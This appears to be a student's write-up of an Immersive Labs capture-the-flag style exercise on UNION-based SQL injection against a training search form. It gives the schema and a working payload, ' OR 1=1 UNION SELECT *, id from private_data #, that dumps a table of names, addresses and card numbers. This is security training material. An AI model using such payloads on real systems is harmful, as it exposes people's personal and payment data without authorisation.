# Immersive Labs Write-up - SQL Injection UNION

## Description of problem

The ChatChat application has a search bar at the bottom of the page which allows users to search for other users by username. Try 'Ricochet' or 'Razzmatazz' to see some results. The form is vulnerable to SQL injection. Your task is to use different Union SQL injection techniques, to extract information from the database.

We can inject the `UNION` operator into a vulnerable parameter to append our own SQL statements. There must be an equal number of columns in each of the `SELECT` statements and corresponding columns must have the same data type.

Union in SQL is used to return an extra set of data along with the initial `SELECT` statement. As an attacker, we can leverage this to return data from additional columns and tables.



## Solution

Test injection works, we can use or 1=1 to get all result at first.

![image-20230521020811367](/Users/luohaochen/Library/Application Support/typora-user-images/image-20230521020811367.png)

Database Schema:

```SQL
CREATE TABLE `creators` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50),
  `subscribers` int(11),
  `category` varchar(50),
  `team` varchar(50),
  `twitter` varchar(50),
  `instagram` varchar(50),
  PRIMARY KEY (`id`)
)
CREATE TABLE `private_data` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `full_name` varchar(50),
  `address` text,
  `phone_number` varchar(50),
  `card_num` varchar(50),
  `exp_date` varchar(50),
  PRIMARY KEY (`id`)
)
```

We can see that two table has different columns.

Key questions:

What is Dale Herbert's address?

What is the credit card number belonging to Sonya Jarvis?

What is the real name of the user with the Twitter handle of MrBigmouth?

To find answer for them, we can union two tables and extract all information:

```SQL
' OR 1=1 UNION SELECT *, id from private_data #
```

![image-20230521021049488](/Users/luohaochen/Library/Application Support/typora-user-images/image-20230521021049488.png)

Then we can find information we need from here.